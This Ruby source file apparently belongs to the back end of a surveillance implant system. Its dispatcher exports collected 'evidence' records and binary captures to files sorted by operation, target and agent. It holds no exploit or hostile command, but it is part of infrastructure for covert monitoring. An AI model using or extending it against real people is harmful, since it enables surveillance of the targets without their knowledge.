require 'rcs-common/trace'
require 'fileutils'

module RCS
  module Connector
    module Dispatcher
      extend RCS::Tracer
      extend self

      def dispatch
        unless can_dispatch?
          trace :warn, "Cannot dispatch connectors queue due to license limitation."
          @status_message = "license needed"
          return
        end

        connector_queue = ConnectorQueue.take
        return unless connector_queue

        @status_message = "working"

        process(connector_queue)

        @status_message = "idle"
      rescue Exception => ex
        @status_message = "error"
        trace :error, ex.message
        raise(ex)
      end

      def reset_status_message
        @status_message = nil
      end

      def status_message
        (@status_message || "idle").capitalize
      end

      def destroy_related_evidence(connector_queue)
        evidence = related_evidence(connector_queue)
        return unless evidence
        evidence.destroy
      end

      def related_evidence(connector_queue)
        connector_queue.evidence
      rescue Mongoid::Errors::DocumentNotFound => error
        data = connector_queue.data
        trace :warn, "Connectors dispatcher: cannot find evidence #{data['evidence_id']} of target #{data['target_id']}"
        nil
      end

      def process(connector_queue)
        trace :debug, "Processing ConnectorQueue #{connector_queue.id}, #{connector_queue.data.inspect}"

        connectors = connector_queue.connectors

        connectors.each do |connector|
          send(:"process_#{connector.type}", connector, connector_queue)
          connector_queue.complete(connector)
        end

        destroy_related_evidence(connector_queue) unless connector_queue.keep?
        connector_queue.destroy
      end

      # TODO
      def process_archive(connector, connector_queue)
      end

      def process_dump(connector, connector_queue)
        evidence = related_evidence(connector_queue)
        return unless evidence
        dump(evidence, connector)
      end

      # Checks the license
      def can_dispatch?
        LicenseManager.instance.check :connectors
      end

      # Dump the given evidence to a file following the rules specified
      # in the connector.
      def dump(evidence, connector)
        trace :debug, "Dumping #{evidence.id} with connector #{connector.id}"

        # the generator of the evidence
        agent = ::Item.find(evidence.aid)
        operation = ::Item.find(agent.path.first)
        target = ::Item.find(agent.path.last)

        # prepare it for export
        exported = evidence.as_document.stringify_keys
        exported['data'] = evidence.data.stringify_keys

        # don't export uninteresting fields
        ['blo', 'note', 'kw'].each {|name| exported.delete(name) }

        # insert operation and target references
        exported['oid'] = operation.id.to_s
        exported['tid'] = target.id.to_s

        exported['operation'] = operation.name
        exported['target'] = target.name
        exported['agent'] = agent.name

        if evidence.data['_grid']
          exported['data'].delete('_grid')
          exported['data']['_bin_size'] = exported['data'].delete('_grid_size')
        end

        # TODO: support XML conversion
        # convert it to json
        exported = connector.format == :xml ? exported.to_xml(root: 'evidence') : exported.to_json
        file_ext = connector.format.to_s.downcase

        # the full exporting path will be splitted in subdir (one for each item)
        folders = [connector.dest]
        folders << "#{operation.name}-#{operation.id}"
        folders << "#{target.name}-#{target.id}"
        folders << "#{agent.name}-#{agent.id}"
        path = File.join(*folders)

        # ensure the dest folder is created
        FileUtils.mkdir_p(path)

        # dump the evidence
        File.open(File.join(path, "#{evidence.id}.#{file_ext}"), 'wb') { |d| d.write(exported) }

        # dump the binary (if any)
        if evidence.data['_grid']
          file = RCS::DB::GridFS.get(evidence.data['_grid'], target.id.to_s)
          File.open(File.join(path, "#{evidence.id}.bin"), 'wb') { |d| d.write(file.read) }
        end
      end
    end
  end
end
